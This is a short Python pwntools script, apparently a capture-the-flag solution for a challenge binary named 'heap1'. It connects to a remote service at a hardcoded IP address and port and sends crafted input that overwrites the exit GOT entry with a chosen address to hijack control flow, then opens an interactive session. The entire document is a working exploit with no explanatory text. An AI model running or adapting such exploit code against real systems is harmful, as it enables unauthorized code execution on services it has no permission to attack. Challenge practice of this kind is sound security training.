from pwn import *

goal = 0x4007b6

got_scanf = 0x601050
got_exit = 0x601058

r = process('heap1')
r = remote('140.110.112.77', 3125)
raw_input('debug')
r.recvuntil('rsize: ')
r.sendline('200')
r.sendline(p64(got_exit))
r.sendline('{} {}'.format('0', str(goal)))
r.sendline('25 25')
r.interactive()
